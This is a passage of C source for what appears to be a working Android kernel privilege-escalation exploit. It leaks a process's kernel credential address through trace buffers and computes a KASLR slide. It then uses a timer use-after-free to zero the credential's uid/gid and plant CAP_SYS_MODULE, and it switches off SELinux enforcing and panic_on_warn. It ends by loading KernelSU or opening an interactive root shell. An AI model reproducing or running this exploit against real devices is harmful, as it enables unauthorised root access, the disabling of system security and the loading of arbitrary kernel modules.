                                    (char *)cmode, NULL};
                char *const ep[] = {(char *)"PATH=/system/bin:/system/xbin", NULL};

                execve("/proc/self/exe", av, ep);
            }
            _exit(127);
        }
        if (p < 0)
        {
            close(go[0]);
            close(go[1]);
            close(st[0]);
            close(st[1]);
            return 0;
        }
        close(go[0]);
        close(st[1]);
        if (write(go[1], "A", 1) != 1)
            logf("[!] leak go write failed\n");
        usleep(50000);
        trace_stop();
        n = read_cpu(g_cpu, raw, 48u << 20);
        if (n > 0)
        {
            c = scan_cred_allocs(raw, (size_t)n, (int)p, &site, &R);
            tc = scan_task_allocs(raw, (size_t)n, getpid(), &task);
        }
        if (R && c == 1 && (!g_fake_stage || task))
        {
            struct pollfd pf = {.fd = st[0], .events = POLLIN};

            if (poll(&pf, 1, 2000) > 0 &&
                read(st[0], &hello, sizeof(hello)) == sizeof(hello) &&
                hello == CHILD_HELLO)
            {
                logf("[cred] attempt=%d child=%d R=%#llx site_low=%#llx "
                     "recs=%d task=%#llx task_recs=%d\n",
                     attempt, p, R, site & GLK98260_TRACE_SITE_LOW_MASK,
                     c, task, tc);
                *out_pid = p;
                *out_go = go[1];
                *out_st = st[0];
                *task_out = task;
                return R;
            }
        }
        logf("[cred] attempt=%d child=%d R=%#llx hello=%#x recs=%d "
             "task=%#llx task_recs=%d failed\n",
             attempt, p, R, hello, c, task, tc);
        close(go[1]);
        close(st[0]);
        kill(p, SIGKILL);
        waitpid(p, NULL, 0);
    }
    return 0;
}

static int wait_child_main(const char *mode)
{
    struct child_report rep;
    char ch;
    int hello = CHILD_HELLO;

    pin(g_cpu);
    if (write(4, &hello, sizeof(hello)) != sizeof(hello))
        _exit(130);
    for (;;)
    {
        if (read(3, &ch, 1) != 1)
            _exit(131);
        memset(&rep, 0, sizeof(rep));
        rep.magic = CHILD_MAGIC;
        rep.uid = (int)syscall(SYS_getuid);
        rep.euid = (int)syscall(SYS_geteuid);
        logf("[child] command=%c uid=%d euid=%d\n", ch, rep.uid, rep.euid);
        if (ch == GLK98260_CHILD_COMMAND_VERIFY)
        {
            rep.setuid_ret = rep.uid == 0 ? 0 : -1;
            if (write(4, &rep, sizeof(rep)) != sizeof(rep))
                _exit(132);
            continue;
        }
        if (ch != GLK98260_CHILD_COMMAND_COMMIT)
            _exit(133);
        break;
    }
    close(3);

    if (rep.uid != 0)
    {
        rep.setuid_ret = -1;
        (void)write(4, &rep, sizeof(rep));
        close(4);
        logf("[-] child uid is not 0: cred write did not land\n");
        _exit(3);
    }

    if (!strcmp(mode, "fake"))
    {
        unsigned long long cap_amb, cap_eff, cap_inh, cap_prm;
        int loaded = 0;
        int kptr_restrict_original = -1;
        int kptr_restrict_restore_ret = -1;
        int selinux_restore_ret = -1;
        int worker_status = 0;
        pid_t worker;

        /**
         * The real uid/gid fields are already zero.  With inheritable and
         * permitted planted first, the ordinary setuid transition makes the
         * capability effective; ambient CAP_SYS_MODULE then preserves it
         * across the direct ksud exec.
         */
        errno = 0;
        rep.setgid_ret = (int)syscall(SYS_setresgid, 0, 0, 0);
        rep.setgid_errno = errno;
        errno = 0;
        rep.setuid_ret = (int)syscall(SYS_setuid, 0);
        rep.setuid_errno = errno;
        errno = 0;
        rep.ambient_ret = prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE,
                                GLK98260_CAP_SYS_MODULE_NR, 0UL, 0UL);
        rep.ambient_errno = errno;
        {
            uid_t ru = 0, eu = 0, su = 0;

            getresuid(&ru, &eu, &su);
            rep.ruid = (int)ru;
            rep.reuid = (int)eu;
            rep.rsuid = (int)su;
        }
        rep.fsgid = (int)syscall(SYS_setfsgid, (gid_t)-1);
        rep.fsuid = (int)syscall(SYS_setfsuid, (uid_t)-1);
        (void)write(4, &rep, sizeof(rep));
        close(4);
        cap_inh = read_child_status_hex(getpid(), "CapInh");
        cap_prm = read_child_status_hex(getpid(), "CapPrm");
        cap_eff = read_child_status_hex(getpid(), "CapEff");
        cap_amb = read_child_status_hex(getpid(), "CapAmb");
        logf("[ksu] loader resuid=%d/%d/%d fsuid=%d fsgid=%d "
             "ambient=%d/%d CapInh=%#llx CapPrm=%#llx CapEff=%#llx "
             "CapAmb=%#llx\n",
             rep.ruid, rep.reuid, rep.rsuid, rep.fsuid, rep.fsgid,
             rep.ambient_ret, rep.ambient_errno, cap_inh, cap_prm, cap_eff,
             cap_amb);
        if (rep.setgid_ret != 0 || rep.setuid_ret != 0 ||
            rep.ambient_ret != 0 ||
            !(cap_inh & GLK98260_CAP_SYS_MODULE_MASK) ||
            !(cap_prm & GLK98260_CAP_SYS_MODULE_MASK) ||
            !(cap_amb & GLK98260_CAP_SYS_MODULE_MASK))
            _exit(4);
        kptr_restrict_original = read_kptr_restrict();
        if (kptr_restrict_original < 0 ||
            set_kptr_restrict(GLK98260_KPTR_RESTRICT_VISIBLE) != 0)
        {
            logf("[-] KSU kallsyms setup failed original=%d errno=%d\n",
                 kptr_restrict_original, errno);
            (void)restore_selinux_enforcing();
            _exit(5);
        }
        logf("[ksu] kptr_restrict=%d original=%d\n",
             GLK98260_KPTR_RESTRICT_VISIBLE, kptr_restrict_original);
        worker = fork();
        if (worker == 0)
        {
            char *const av[] = {(char *)"/proc/self/exe",
                                (char *)"ksu-worker", NULL};
            char *const ep[] = {
                (char *)"PATH=/system/bin:/system/xbin:/sbin:/vendor/bin",
                (char *)"HOME=/", (char *)"TMPDIR=/data/local/tmp",
                (char *)"ANDROID_DATA=/data", (char *)"ANDROID_ROOT=/system",
                NULL};

            execve("/proc/self/exe", av, ep);
            _exit(127);
        }
        if (worker > 0)
            (void)waitpid(worker, &worker_status, 0);
        for (int i = 0; i < 50 && !loaded; i++)
        {
            loaded = kernelsu_module_loaded();
            if (!loaded)
                usleep(100000);
        }
        logf("[ksu] worker=%d status=%#x loaded=%d\n",
             worker, worker_status, loaded);
        kptr_restrict_restore_ret =
            set_kptr_restrict(kptr_restrict_original);
        selinux_restore_ret = restore_selinux_enforcing();
        logf("[ksu] cleanup kptr=%d selinux=%d\n",
             kptr_restrict_restore_ret, selinux_restore_ret);
        if (worker <= 0 || !WIFEXITED(worker_status) ||
            WEXITSTATUS(worker_status) != 0 || !loaded)
            _exit(6);
        /**
         * @note Mechanical change: use the unconditional cleanup readback above
         *       so both loader success and loader failure restore kernel state.
         */
        if (kptr_restrict_restore_ret != 0 || selinux_restore_ret != 0)
        {
            logf("[ksu] module loaded but kernel-state restore failed\n");
            _exit(7);
        }
        logf("KSU_LOADED enforce=1\n");
        _exit(0);
    }

    /**
     * Plant 1 zeroes uid+gid only; egid is still 2000.  If it stays that way
     * across execve(), cap_bprm's setgid downgrade intersects permitted with
     * the old (empty) set and the expanded bset never becomes effective.
     */
    errno = 0;
    {
        long sg = syscall(SYS_setresgid, 0, 0, 0);

        rep.setgid_ret = (int)sg;
        rep.setgid_errno = errno;
        logf("[child] setresgid(0)=%ld errno=%d\n", sg, errno);
    }
    errno = 0;
    rep.setuid_ret = (int)syscall(SYS_setuid, 0);
    rep.setuid_errno = errno;
    {
        uid_t ru = 0, eu = 0, su = 0;

        getresuid(&ru, &eu, &su);
        rep.ruid = (int)ru;
        rep.reuid = (int)eu;
        rep.rsuid = (int)su;
    }
    (void)write(4, &rep, sizeof(rep));
    close(4);
    logf("[child] setuid(0)=%d errno=%d resuid=%d/%d/%d\n",
         rep.setuid_ret, rep.setuid_errno, rep.ruid, rep.reuid, rep.rsuid);
    if (rep.setuid_ret != 0)
    {
        logf("[-] setuid(0) failed; not running a shell\n");
        _exit(4);
    }

    {
        char *const envp[] = {
            (char *)"PATH=/system/bin:/system/xbin:/sbin:/vendor/bin",
            (char *)"HOME=/", (char *)"TMPDIR=/data/local/tmp",
            (char *)"ANDROID_DATA=/data", (char *)"ANDROID_ROOT=/system",
            NULL};

        if (!strcmp(mode, "shell"))
        {
            char *const av[] = {(char *)"sh", (char *)"-i", NULL};

            execve("/system/bin/sh", av, envp);
        }
        else
        {
            char *const av[] = {(char *)"sh", (char *)"-c",
                                (char *)"id; cat /proc/self/attr/current 2>/dev/null; "
                                        "echo ROOT_SHELL_OK",
                                NULL};

            execve("/system/bin/sh", av, envp);
        }
    }
    logf("[-] shell exec failed errno=%d\n", errno);
    _exit(5);
}

int main(int argc, char **argv)
{
    unsigned char *raw;
    int shell_mode = 0, leak_only = 0, ids_only = 0;
    int report_ok = 0, child_ok = 0;

    setvbuf(stdout, NULL, _IONBF, 0);
    if (argc > 1 && !strcmp(argv[1], "ksu-worker"))
        return ksu_worker_main();
    if (argc > 1 && !strcmp(argv[1], "wait"))
        return wait_child_main(argc > 2 ? argv[2] : "verify");

    if (argc > 1 && !strcmp(argv[1], "shell"))
        shell_mode = 1;
    if (argc > 1 && !strcmp(argv[1], "leak"))
        leak_only = 1;
    if (argc > 1 && !strcmp(argv[1], "ids"))
        ids_only = 1;
    if (argc > 1 && !strcmp(argv[1], "fake"))
        g_fake_stage = 1;

    raw = malloc(48u << 20);
    if (!raw)
        return 1;
    if (argc > 2 && !strcmp(argv[1], "cpu"))
        g_cpu = atoi(argv[2]);

    if (argv[0] && argv[0][0] == '\0')
        _exit(42);

    {
        struct rlimit rl;

        if (!getrlimit(RLIMIT_NOFILE, &rl))
        {
            rl.rlim_cur = rl.rlim_max;
            if (rl.rlim_cur > 65536)
                rl.rlim_cur = 65536;
            (void)setrlimit(RLIMIT_NOFILE, &rl);
        }
    }

    pin(g_cpu);
    logf("[target] id=%s params=%s kmi=%s\n", GLK98260_TARGET_ID,
         GLK98260_PARAM_REVISION, GLK98260_KSU_KMI);
    logf("[+] pid=%d cpu=%d\n", getpid(), g_cpu);
    if (configure_trace_buffer() != 0)
    {
        logf("[-] trace buffer preflight failed\n");
        return 1;
    }
    enable_events();
    kick_rss();
    usleep(50000);

    if (discover_page_types(raw) != 0)
        return 1;
    if (ids_only)
        return 0;

    g_base = calibrate_base(raw);
    if (!g_base)
    {
        logf("[-] base calibration failed\n");
        return 1;
    }
    if (!g_slide_ready)
    {
        logf("[-] timer allocation site did not yield a KASLR slide\n");
        return 1;
    }
    prefill_timers(PREFILL_TIMERS);

    pid_t C = -1;
    int go_fd = -1, st_fd = -1;
    unsigned long long R = leak_cred(raw, &C, &go_fd, &st_fd, shell_mode,
                                     &g_child_task);
    if (!R)
    {
        logf("[-] cred leak failed\n");
        return 1;
    }
    logf("[+] child=%d cred=%#llx target=%#llx\n", C, R,
         R + CRED_UID_OFF);
    if (leak_only)
    {
        close(go_fd);
        close(st_fd);
        kill(C, SIGKILL);
        waitpid(C, NULL, 0);
        logf("[+] leak-only run complete\n");
        return 0;
    }
#if !GLK98260_EXEC_MMAP_HAS_KILLABLE_MMAP_LOCK && \
    !GLK98260_TRIGGER_HAS_CORE_STATE_COREDUMP
    /**
     * A301SO's exact exec_mmap uses an uninterruptible mmap_read_lock.  The
     * locker/SIGKILL trigger therefore cannot return from exec_mmap before
     * posix_cpu_timers_exit removes the victim node.  Offsets do not repair
     * this control-flow prerequisite, so stop before any stale-node plant.
     */
    logf("[prereq] FAIL exec_mmap uses non-killable mmap_read_lock; ");
    logf("6.1+ locker/SIGKILL trigger is incompatible with this kernel\n");
    close(go_fd);
    close(st_fd);
    kill(C, SIGKILL);
    waitpid(C, NULL, 0);
    return 2;
#endif
    logf("[prereq] PASS trigger=%s\n",
         GLK98260_TRIGGER_HAS_CORE_STATE_COREDUMP
             ? "shared-mm-core_state"
             : "killable-mmap-lock");
    if (g_fake_stage && prepare_ksud() != 0)
    {
        close(go_fd);
        close(st_fd);
        kill(C, SIGKILL);
        waitpid(C, NULL, 0);
        return 1;
    }
    if (ensure_pool() || ensure_raw())
    {
        logf("[-] armed resource preflight failed\n");
        close(go_fd);
        close(st_fd);
        kill(C, SIGKILL);
        waitpid(C, NULL, 0);
        return 1;
    }

    if (!g_fake_stage)
    {
        struct plant_res r;
        struct child_report verify_rep;
        int real_verified = 0;

        for (unsigned attempt = 1;
             attempt <= GLK98260_REAL_WRITE_VERIFY_ATTEMPTS; attempt++)
        {
            memset(&r, 0, sizeof(r));
            if (stage_write(R + CRED_UID_OFF, 0, "real_uid_gid", raw, &r))
                park_forever("no successful plant");
            if (child_command_report(go_fd, st_fd,
                                     GLK98260_CHILD_COMMAND_VERIFY,
                                     &verify_rep))
                park_forever("real-cred readback missing");
            logf("[real-verify] attempt=%u/%u uid=%d euid=%d\n", attempt,
                 GLK98260_REAL_WRITE_VERIFY_ATTEMPTS, verify_rep.uid,
                 verify_rep.euid);
            if (verify_rep.uid == 0)
            {
                real_verified = 1;
                break;
            }
            logf("[real-verify] controlled reclaim did not change uid; retrying\n");
        }
        if (!real_verified)
            park_forever("real-cred write unverified after controlled retries");
        logf("[+] real cred write verified by child uid readback\n");
    }
    else
    {
        struct plant_res cap_inh, cap_prm;
        struct child_report verify_rep;
        unsigned long long cap_inh_value, cap_prm_value;

        if (!g_slide_ready)
            park_forever("no KASLR slide");
        if (stage_write(PANIC_ON_WARN_STATIC + g_slide, 0,
                        "panic_on_warn", raw, NULL))
            park_forever("panic_on_warn write failed");
        memset(&cap_inh, 0, sizeof(cap_inh));
        if (stage_write(R + GLK98260_CRED_CAP_INHERITABLE_OFF, 1,
                        "cap_inheritable", raw, &cap_inh))
            park_forever("CAP_SYS_MODULE inheritable write failed");
        cap_inh_value = read_child_status_hex(C, "CapInh");
        logf("[ksu-verify] A=%#llx CapInh=%#llx required=%#llx\n",
             cap_inh.A, cap_inh_value, GLK98260_CAP_SYS_MODULE_MASK);
        if (!(cap_inh_value & GLK98260_CAP_SYS_MODULE_MASK))
            park_forever("CAP_SYS_MODULE inheritable readback failed");
        memset(&cap_prm, 0, sizeof(cap_prm));
        if (stage_write(R + GLK98260_CRED_CAP_PERMITTED_OFF, 1,
                        "cap_permitted", raw, &cap_prm))
            park_forever("CAP_SYS_MODULE permitted write failed");
        cap_prm_value = read_child_status_hex(C, "CapPrm");
        logf("[ksu-verify] A=%#llx CapPrm=%#llx required=%#llx\n",
             cap_prm.A, cap_prm_value, GLK98260_CAP_SYS_MODULE_MASK);
        if (!(cap_prm_value & GLK98260_CAP_SYS_MODULE_MASK))
            park_forever("CAP_SYS_MODULE permitted readback failed");
        /**
         * Clearing enforcing makes module loading reachable from the shell
         * domain.  panic_on_warn is cleared first because the self-parent
         * pointer plant can reach the RB_EMPTY_NODE warning path.
         */
        logf("[+] KSU preflight selinux_state=%#llx\n",
             SELINUX_STATE_STATIC + g_slide);
        if (stage_write(SELINUX_STATE_STATIC + g_slide +
                            GLK98260_SELINUX_ENFORCING_OFF -
                            GLK98260_SELINUX_ZERO_WRITE_BIAS,
                        0, "selinux", raw, NULL))
            park_forever("selinux write failed");
        if (read_panic_on_warn() != 0)
            park_forever("panic_on_warn zero readback failed");
        if (stage_write(R + CRED_UID_OFF, 0, "loader_uid_gid", raw, NULL))
            park_forever("loader uid/gid write failed");
        if (child_command_report(go_fd, st_fd,
                                 GLK98260_CHILD_COMMAND_VERIFY,
                                 &verify_rep))
            park_forever("loader uid readback missing");
        logf("[ksu-verify] uid=%d euid=%d\n", verify_rep.uid,
             verify_rep.euid);
        if (verify_rep.uid != 0)
            park_forever("loader uid readback failed");
    }
    logf("[+] write stages complete, committing child\n");

    {
        char command = GLK98260_CHILD_COMMAND_COMMIT;

        if (write(go_fd, &command, 1) != 1)
            logf("[!] child commit write failed\n");
    }
    close(go_fd);

    {
        struct child_report rep;
        struct pollfd pf = {.fd = st_fd, .events = POLLIN};
        ssize_t rn = -1;

        if (poll(&pf, 1, 10000) > 0)
            rn = read(st_fd, &rep, sizeof(rep));
        close(st_fd);
        if (rn == (ssize_t)sizeof(rep) && rep.magic == CHILD_MAGIC)
        {
            logf("[+] child report uid=%d euid=%d setgid=%d/%d setuid=%d/%d "
                 "resuid=%d/%d/%d fsuid=%d fsgid=%d ambient=%d/%d\n",
                 rep.uid, rep.euid, rep.setgid_ret, rep.setgid_errno,
                 rep.setuid_ret, rep.setuid_errno, rep.ruid, rep.reuid,
                 rep.rsuid, rep.fsuid, rep.fsgid, rep.ambient_ret,
                 rep.ambient_errno);
            if (g_fake_stage)
            {
                /**
                 * The report captures uid/euid before the transition and
                 * confirms the same real-cred setuid path as the shell gate,
                 * plus the ambient-capability promotion required by ksud.
                 */
                report_ok =
                    rep.uid == 0 &&
                    rep.euid == (int)GLK98260_EXPECTED_SHELL_ID &&
                    rep.setgid_ret == 0 && rep.setuid_ret == 0 &&
                    rep.ruid == 0 && rep.reuid == 0 &&
                    rep.rsuid == (int)GLK98260_EXPECTED_SHELL_ID &&
                    rep.fsuid == 0 && rep.fsgid == 0 &&
                    rep.ambient_ret == 0;
            }
            else
            {
                /**
                 * The zero write changes real uid/gid only.  From an
                 * unprivileged euid, setuid(real_uid) changes the effective
                 * uid while POSIX preserves the original saved uid.
                 */
                report_ok =
                    rep.uid == 0 &&
                    rep.euid == (int)GLK98260_EXPECTED_SHELL_ID &&
                    rep.setgid_ret == 0 && rep.setuid_ret == 0 &&
                    rep.ruid == 0 && rep.reuid == 0 &&
                    rep.rsuid == (int)GLK98260_EXPECTED_SHELL_ID;
            }
            if (!report_ok)
                logf("[!] child acceptance fields mismatch\n");
        }
        else
        {
            logf("[!] child report missing (n=%zd)\n", rn);
        }
    }

    {
        int st = 0;

        if (waitpid(C, &st, 0) == C)
        {
            logf("[+] child exit status=%#x\n", st);
            child_ok = WIFEXITED(st) && WEXITSTATUS(st) == 0;
        }
    }
    if (g_fake_stage)
    {
        logf("[%s] KSU child handoff report=%d child=%d must_reboot=1\n",
             report_ok && child_ok ? "KSU_HANDOFF_PASS" : "KSU_HANDOFF_FAIL",
             report_ok, child_ok);
        if (g_held)
            park_forever("KSU handoff finished with held reclaim zombies");
        return report_ok && child_ok ? 0 : 2;
    }
    if (g_held)
        park_forever("root shell finished; failed-plant zombies are held");
    if (!report_ok || !child_ok)
    {
        logf("[REAL_CRED_FAIL] report=%d child=%d must_reboot=1\n",
             report_ok, child_ok);
        return 2;
    }
    logf("[REAL_CRED_PASS] report=1 child=1 held=0 must_reboot=1\n");
    logf("[+] done\n");
    return 0;
}
